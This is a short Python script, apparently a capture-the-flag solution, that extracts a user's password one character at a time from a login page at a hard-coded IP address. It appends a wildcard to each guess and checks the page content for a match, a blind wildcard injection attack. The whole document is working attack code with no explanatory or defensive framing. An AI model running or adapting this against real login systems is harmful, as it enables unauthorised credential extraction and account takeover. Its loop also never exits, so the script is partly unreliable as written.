import requests
import string

url = 'http://167.99.81.99:31435/login'
session = requests.session()
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
while True:
    for char in alphabet:
       data = {'username':'Reese','password':flag+char+'*'}
       response = session.post(url,data = data)
       content = response.text
       if ('const queryString = window.location.search;' not in content):
            flag += char
            print("[+] Flag: " + flag)
            break;

print("Flag: \t" + flag)
